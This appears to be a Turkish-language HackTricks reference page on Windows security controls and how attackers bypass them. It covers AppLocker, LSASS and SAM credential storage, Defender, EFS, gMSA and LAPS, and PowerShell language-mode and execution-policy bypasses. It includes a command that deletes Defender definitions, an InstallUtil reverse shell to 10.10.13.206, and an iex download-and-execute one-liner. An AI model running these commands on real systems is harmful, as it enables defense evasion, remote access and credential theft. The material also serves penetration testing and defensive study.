# Windows Güvenlik Denetimleri

{{#include ../banners/hacktricks-training.md}}

## AppLocker İlkesi

Bir application whitelist, bir sistemde bulunmasına ve çalıştırılmasına izin verilen onaylı yazılım uygulamalarının veya çalıştırılabilir dosyaların listesidir. Amaç, ortamı zararlı malware'lerden ve bir kuruluşun belirli iş ihtiyaçlarıyla uyumlu olmayan onaylanmamış yazılımlardan korumaktır.

[AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker), Microsoft'un **application whitelisting solution**'ıdır ve sistem yöneticilerine **kullanıcıların hangi uygulamaları ve dosyaları çalıştırabileceği** üzerinde kontrol sağlar. Çalıştırılabilir dosyalar, script'ler, Windows installer dosyaları, DLL'ler, packaged apps ve packed app installer'lar üzerinde **ayrıntılı kontrol** sunar.\
Kuruluşların **cmd.exe ve PowerShell.exe'yi** ve belirli dizinlere yazma erişimini **engellemesi yaygındır**, **ancak bunların tümü bypass edilebilir**.

### Kontrol

Hangi dosyaların/uzantıların blacklisted/whitelisted olduğunu kontrol edin:
```bash
Get-ApplockerPolicy -Effective -xml

Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

$a = Get-ApplockerPolicy -effective
$a.rulecollections
```
`Test-AppLockerPolicy`, belirli bir kimlik için aday dosyaları bir AppLocker policy'ye göre değerlendirir. Kurallar kullanıcıları veya grupları hedefleyebileceğinden, payload'u çalıştıracak token'a sahip hesabı test edin; `Get-AppLockerFileInformation`, kuralların eşleşebileceği yol, hash ve yayıncı meta verilerini incelemek için de kullanışlıdır.<sup>[[5]](#references)</sup>
```powershell
$policy = Get-AppLockerPolicy -Effective
$user = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
Test-AppLockerPolicy -PolicyObject $policy -Path C:\Users\Public\payload.exe -User $user
Get-AppLockerFileInformation -Path C:\Users\Public\payload.exe | Format-List
```
Bu registry path, AppLocker tarafından uygulanan yapılandırmaları ve policies içerir ve sistemde yürürlükte olan mevcut rules kümesini incelemek için bir yol sağlar:

- `HKLM\Software\Policies\Microsoft\Windows\SrpV2`

### Bypass

- AppLocker Policy'yi bypass etmek için kullanışlı **yazılabilir klasörler**: AppLocker, `C:\Windows\System32` veya `C:\Windows` içinde herhangi bir şeyin çalıştırılmasına izin veriyorsa, bunu **bypass etmek** için kullanabileceğiniz **yazılabilir klasörler** bulunur.
```
C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
C:\Windows\System32\spool\drivers\color
C:\Windows\Tasks
C:\windows\tracing
```
- Yaygın olarak **güvenilen** [**"LOLBAS's"**](https://lolbas-project.github.io/) binary'leri AppLocker'ı bypass etmek için de yararlı olabilir.
- **Kötü yazılmış kurallar da bypass edilebilir**
- Örneğin, **`<FilePathCondition Path="%OSDRIVE%*\allowed*"/>`** için herhangi bir yerde **`allowed` adlı bir klasör** oluşturabilirsiniz ve bu klasöre izin verilir.
- Kuruluşlar ayrıca genellikle **`%System32%\WindowsPowerShell\v1.0\powershell.exe` executable'ını engellemeye** odaklanır, ancak `%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe` veya `PowerShell_ISE.exe` gibi diğer [**PowerShell executable konumlarını**](https://www.powershelladmin.com/wiki/PowerShell_Executables_File_System_Locations) unuturlar.
- **DLL enforcement**, bir sistem üzerinde oluşturabileceği ek yük ve hiçbir şeyin bozulmayacağından emin olmak için gereken test miktarı nedeniyle çok nadiren etkinleştirilir. Bu nedenle **DLL'leri backdoor olarak kullanmak AppLocker'ı bypass etmeye yardımcı olur**.
- AppLocker'ı bypass ederek herhangi bir process içinde **Powershell** kodu çalıştırmak için [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) veya [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) kullanabilirsiniz. Daha fazla bilgi için şuraya bakın: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode).<sup>[[1]](#references)</sup>

## Credentials Storage

### Security Accounts Manager (SAM)

Yerel credentials bu dosyada bulunur; parolalar hash'lenmiştir.

### Local Security Authority (LSA) - LSASS

**Credentials**, Single Sign-On nedenleriyle bu alt sistemin **memory**'sinde **hashed** olarak **saklanır**.\
**LSA**, yerel **security policy**'yi (password policy, users permissions...), **authentication**'ı, **access tokens**'ı... yönetir.\
LSA, sağlanan credentials'ları **SAM** dosyasında (yerel login için) **kontrol eder** ve bir domain user'ı authenticate etmek için **domain controller** ile **iletişim kurar**.

**Credentials**, **process LSASS** içinde **saklanır**: Kerberos tickets, NT ve LM hashes, kolayca decrypt edilebilen parolalar.

### LSA secrets

LSA bazı credentials'ları disk üzerinde saklayabilir:

- Active Directory bilgisayar hesabının parolası (domain controller'a erişilemiyorsa).
- Windows services hesaplarının parolaları
- Scheduled tasks için parolalar
- Diğerleri (IIS uygulamalarının parolası...)

### NTDS.dit

Active Directory'nin database'idir. Yalnızca Domain Controllers üzerinde bulunur.

## Defender

[**Microsoft Defender**](https://en.wikipedia.org/wiki/Microsoft_Defender), Windows 10 ve Windows 11'de ve Windows Server sürümlerinde bulunan bir Antivirus'tür. **`WinPEAS`** gibi yaygın pentesting araçlarını **engeller**. Ancak bu **korumaları bypass etmenin yolları** vardır.

### Check

**Defender**'ın **durumunu** kontrol etmek için PS cmdlet'i **`Get-MpComputerStatus`** çalıştırabilirsiniz (**`RealTimeProtectionEnabled`** değerini kontrol ederek etkin olup olmadığını öğrenin):

<pre class="language-powershell"><code class="lang-powershell">PS C:\> Get-MpComputerStatus

[...]
AntispywareEnabled              : True
AntispywareSignatureAge         : 1
AntispywareSignatureLastUpdated : 12/6/2021 10:14:23 AM
AntispywareSignatureVersion     : 1.323.392.0
AntivirusEnabled                : True
[...]
NISEnabled                      : False
NISEngineVersion                : 0.0.0.0
[...]
<strong>RealTimeProtectionEnabled       : True
</strong>RealTimeScanDirection           : 0
PSComputerName                  :
</code></pre>

Bunu enumerate etmek için şunu da çalıştırabilirsiniz:
```bash
WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List
wmic /namespace:\\root\securitycenter2 path antivirusproduct
sc query windefend

#Delete all rules of Defender (useful for machines without internet access)
"C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
```
## Encrypted File System (EFS)

EFS, **File Encryption Key (FEK)** olarak bilinen bir **symmetric key** kullanarak dosyaları encryption yoluyla güvence altına alır. Bu key, kullanıcının **public key**'i ile şifrelenir ve encrypted file'ın $EFS **alternative data stream**'i içinde saklanır. Decryption gerektiğinde, kullanıcının digital certificate'ının karşılık gelen **private key**'i, $EFS stream'inden FEK'i decrypt etmek için kullanılır. Daha fazla ayrıntı [burada](https://en.wikipedia.org/wiki/Encrypting_File_System) bulunabilir.

**Kullanıcı başlatmadan gerçekleşen decryption senaryoları** şunları içerir:

- Dosyalar veya klasörler [FAT32](https://en.wikipedia.org/wiki/File_Allocation_Table) gibi EFS olmayan bir file system'a taşındığında otomatik olarak decrypt edilir.
- SMB/CIFS protocol üzerinden network üzerinden gönderilen encrypted file'lar, transmission öncesinde decrypt edilir.

Bu encryption yöntemi, owner için encrypted file'lara **transparent access** sağlar. Ancak yalnızca owner'ın password'ünü değiştirmek ve login olmak decryption'a izin vermez.

**Key Takeaways**:

- EFS, kullanıcının public key'i ile encrypted edilen symmetric FEK kullanır.
- Decryption, FEK'e erişmek için kullanıcının private key'ini kullanır.
- FAT32'ye copying veya network transmission gibi belirli koşullarda automatic decryption gerçekleşir.
- Encrypted file'lara owner tarafından ek adım gerekmeksizin erişilebilir.

### EFS info'yu kontrol et

Bir **user**'ın bu **service**'i **kullanıp kullanmadığını**, şu path'in mevcut olup olmadığını kontrol ederek öğrenin:`C:\users\<username>\appdata\roaming\Microsoft\Protect`

`cipher /c \<file>\` kullanarak file'a **erişimi** olan **kişiyi** kontrol edin  
Bir folder içinde tüm file'ları **encrypt** ve **decrypt** etmek için `cipher /e` ve `cipher /d` komutlarını da kullanabilirsiniz

### EFS file'larını decrypt etme

#### Authority System Olmak

Bu yaklaşım, **victim user**'ın host üzerinde bir **process** **çalıştırıyor** olmasını gerektirir. Bu durumda, bir `meterpreter` session'ından kullanıcının process token'ını (`incognito` içindeki `impersonate_token`) impersonate edebilirsiniz. Alternatif olarak kullanıcının process'ine `migrate` edebilirsiniz.

#### User'ın Password'ünü Bilmek

Mimikatz, kullanıcının certificate'ını ve private key'ini import edebilir ve ardından bunları EFS-protected file'ları decrypt etmek için kullanabilir.<sup>[[2]](#references)</sup>

{{#ref}}
https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files
{{#endref}}

## Group Managed Service Accounts (gMSA)

Microsoft, IT infrastructure'larındaki service account'ların yönetimini kolaylaştırmak için **Group Managed Service Accounts (gMSA)** geliştirdi. Genellikle "**Password never expire**" setting'i etkin olan traditional service account'ların aksine, gMSA'ler daha güvenli ve yönetilebilir bir çözüm sunar:

- **Automatic Password Management**: gMSA'ler, domain veya computer policy'ye göre otomatik olarak değişen, 240 karakterlik karmaşık bir password kullanır. Bu process, Microsoft'un Key Distribution Service'i (KDC) tarafından gerçekleştirilir ve manuel password update gereksinimini ortadan kaldırır.
- **Enhanced Security**: Bu account'lar lockout'lara karşı bağışıktır ve interactive login için kullanılamaz; bu da güvenliklerini artırır.
- **Multiple Host Support**: gMSA'ler birden fazla host arasında paylaşılabilir; bu da onları birden fazla server üzerinde çalışan service'ler için ideal hale getirir.
- **Scheduled Task Capability**: managed service account'ların aksine gMSA'ler scheduled task çalıştırmayı destekler.
- **Simplified SPN Management**: Computer'ın sAMaccount ayrıntılarında veya DNS name'inde değişiklik olduğunda system, Service Principal Name'i (SPN) otomatik olarak update eder ve SPN management'ı kolaylaştırır.

gMSA'lerin password'leri LDAP property'si _**msDS-ManagedPassword**_ içinde saklanır ve Domain Controller'lar (DC'ler) tarafından her 30 günde bir otomatik olarak resetlenir. [MSDS-MANAGEDPASSWORD_BLOB](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/a9019740-3d73-46ef-a9ae-3ea8eb86ac2e) olarak bilinen encrypted data blob niteliğindeki bu password, yalnızca authorized administrator'lar ve gMSA'lerin kurulu olduğu server'lar tarafından retrieve edilebilir; bu da güvenli bir environment sağlar. Bu information'a erişmek için LDAPS gibi secured connection gerekir veya connection'ın 'Sealing & Secure' ile authenticated olması gerekir.

![https://cube0x0.github.io/Relaying-for-gMSA/](../images/asd1.png)<sup>[[3]](#references)</sup>

Bu password'ü [**GMSAPasswordReader**](https://github.com/rvazarkar/GMSAPasswordReader)**:** ile okuyabilirsiniz.
```
/GMSAPasswordReader --AccountName jkohler
```
[**Bu gönderide daha fazla bilgi bulabilirsiniz**](https://cube0x0.github.io/Relaying-for-gMSA/)<sup>[[3]](#references)</sup>

Ayrıca, **gMSA**'in **password** değerini **okumak** için nasıl bir **NTLM relay attack** gerçekleştirileceğini anlatan bu [web sayfasına](https://cube0x0.github.io/Relaying-for-gMSA/) göz atın.<sup>[[3]](#references)</sup>

## LAPS

Enumeration sırasında **legacy Microsoft LAPS** ile yerel **Windows LAPS** uygulamasını ayırt edin. Windows LAPS, 11 Nisan 2023 tarihli Windows güncellemeleriyle sunulmuştur ve yönetilen bir local administrator password değerini **Windows Server Active Directory** veya **Microsoft Entra ID** üzerine yedekleyebilir. AD destekli dağıtımlarda ayrıca password değerlerini şifreleyebilir, şifrelenmiş password geçmişini saklayabilir ve bir domain controller'ın DSRM password değerini yönetebilir. İndirilebilir legacy MSI, daha yeni Windows sürümlerinde kullanımdan kaldırılmıştır; ancak Windows LAPS, legacy-emulation mode ile çalışabilir.<sup>[[6]](#references)</sup>

legacy Microsoft LAPS ve Windows LAPS ayrı uygulamalar olduğundan, attribute veya cmdlet'e özgü saldırıları uygulamadan önce hangisinin dağıtıldığını belirleyin. Bağlantısı verilen sayfa discovery, ACL enumeration, retrieval, expiration manipulation ve offline recovery işlemlerini kapsar; bu prosedürler burada tekrarlanmamıştır.<sup>[[6]](#references)</sup>

{{#ref}}
active-directory-methodology/laps.md
{{#endref}}

## PS Constrained Language Mode

PowerShell [**Constrained Language Mode**](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/), PowerShell'i etkili biçimde kullanmak için gereken birçok özelliği **kısıtlar**; örneğin COM nesnelerini engeller, yalnızca onaylanmış .NET türlerine izin verir, XAML tabanlı workflow'ları, PowerShell class'larını ve daha fazlasını kısıtlar.

### **Kontrol**
```bash
$ExecutionContext.SessionState.LanguageMode
#Values could be: FullLanguage or ConstrainedLanguage
```
### Bypass
```bash
#Easy bypass
Powershell -version 2
```
Güncel Windows sürümlerinde bu Bypass çalışmaz, ancak [**PSByPassCLM**](https://github.com/padovah4ck/PSByPassCLM) kullanabilirsiniz.\
**Derlemek için** **şunları** _**Başvuru Ekle**_ -> _Gözat_ ->_Gözat_ -> `C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0\31bf3856ad364e35\System.Management.Automation.dll` eklemeniz ve **projeyi .Net4.5'e geçirmeniz** gerekebilir.

#### Doğrudan bypass:
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U c:\temp\psby.exe
```
#### Reverse shell:
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.13.206 /rport=443 /U c:\temp\psby.exe
```
[**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) veya [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) kullanarak herhangi bir process içinde **Powershell** kodu **execute** edebilir ve constrained mode'u bypass edebilirsiniz. Daha fazla bilgi için: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode).<sup>[[1]](#references)</sup>

## PS Execution Policy

Varsayılan olarak **restricted** olarak ayarlanmıştır. Bu policy'yi bypass etmenin başlıca yolları:<sup>[[4]](#references)</sup>
```bash
1º Just copy and paste inside the interactive PS console
2º Read en Exec
Get-Content .runme.ps1 | PowerShell.exe -noprofile -
3º Read and Exec
Get-Content .runme.ps1 | Invoke-Expression
4º Use other execution policy
PowerShell.exe -ExecutionPolicy Bypass -File .runme.ps1
5º Change users execution policy
Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted
6º Change execution policy for this session
Set-ExecutionPolicy Bypass -Scope Process
7º Download and execute:
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://bit.ly/1kEgbuH')"
8º Use command switch
Powershell -command "Write-Host 'My voice is my passport, verify me.'"
9º Use EncodeCommand
$command = "Write-Host 'My voice is my passport, verify me.'" $bytes = [System.Text.Encoding]::Unicode.GetBytes($command) $encodedCommand = [Convert]::ToBase64String($bytes) powershell.exe -EncodedCommand $encodedCommand
```
Daha fazlasını [burada](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)<sup>[[4]](#references)</sup> bulabilirsiniz.

## Security Support Provider Interface (SSPI)

Kullanıcıların kimliğini doğrulamak için kullanılabilen API'dir.

SSPI, iletişim kurmak isteyen iki makine için uygun protokolü bulmaktan sorumludur. Bunun için tercih edilen yöntem Kerberos'tur. Ardından SSPI, hangi kimlik doğrulama protokolünün kullanılacağını müzakere eder. Bu kimlik doğrulama protokollerine Security Support Provider (SSP) adı verilir; her Windows makinesinin içinde DLL biçiminde bulunurlar ve iletişim kurulabilmesi için her iki makinenin de aynı SSP'yi desteklemesi gerekir.

### Main SSPs

- **Kerberos**: Tercih edilendir
- %windir%\Windows\System32\kerberos.dll
- **NTLMv1** ve **NTLMv2**: Uyumluluk nedenleriyle
- %windir%\Windows\System32\msv1_0.dll
- **Digest**: Web sunucuları ve LDAP; parola MD5 hash biçimindedir
- %windir%\Windows\System32\Wdigest.dll
- **Schannel**: SSL ve TLS
- %windir%\Windows\System32\Schannel.dll
- **Negotiate**: Kullanılacak protokolü müzakere etmek için kullanılır (Kerberos veya NTLM; varsayılan Kerberos'tur)
- %windir%\Windows\System32\lsasrv.dll

#### Müzakere birkaç yöntem veya yalnızca bir yöntem sunabilir.

## UAC - Kullanıcı Hesabı Denetimi

[Kullanıcı Hesabı Denetimi (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works), **yükseltilmiş etkinlikler için onay istemi** sağlayan bir özelliktir.

{{#ref}}
authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}



## References

- [1] [AppLocker ve PowerShell constrained language mode'un bypass edilmesi](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode)
- [2] [EFS dosyalarının şifresini çözme](https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files)
- [3] [gMSA için Relaying](https://cube0x0.github.io/Relaying-for-gMSA/)
- [4] [PowerShell Execution Policy'yi Bypass Etmenin 15 Yolu](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)
- [5] [AppLocker Windows PowerShell cmdlet'lerini kullanma](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/app-control-for-business/applocker/use-the-applocker-windows-powershell-cmdlets)
- [6] [Windows LAPS genel bakışı](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-overview)
{{#include ../banners/hacktricks-training.md}}
